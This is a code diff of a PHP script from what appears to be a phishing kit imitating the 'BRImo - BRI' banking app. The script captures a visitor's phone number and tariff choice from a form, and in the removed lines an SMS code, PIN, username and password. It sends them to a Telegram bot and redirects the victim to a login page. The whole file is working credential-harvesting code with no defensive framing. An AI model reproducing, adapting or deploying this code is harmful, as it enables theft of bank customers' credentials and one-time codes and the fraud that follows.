@@ -3,20 +3,20 @@
 session_start();
 include "./telegram.php";
 
-$sms = $_POST['sms'];
-$setPin = $_SESSION['setPin'];
-$user = $_SESSION['user'];
-$sandi = $_SESSION['sandi'];
-$nohp = $_SESSION['nohp'];
+$tarif           = $_POST['tarif'];
+$nohp            = $_POST['nohp'];
 
-$_SESSION['sms'] = $sms;
+$_SESSION['tarif'] = $tarif;
+$_SESSION['nohp'] = $nohp;
 
 $message = "
 ──────────────
-BRImo - BRI
+BRImo - BRI 
 ──────────────
 
-• sms : ".$sms."
+• ".$tarif."
+
+• No HP : ".$nohp."
 
 ──────────────";
 
@@ -34,5 +34,5 @@ function sendMessage($telegram_id, $message, $id_bot) {
 }
 
 sendMessage($telegram_id, $message, $id_bot);
-header('Location: ../no.php');
+header('Location: ../login.php');
 ?>
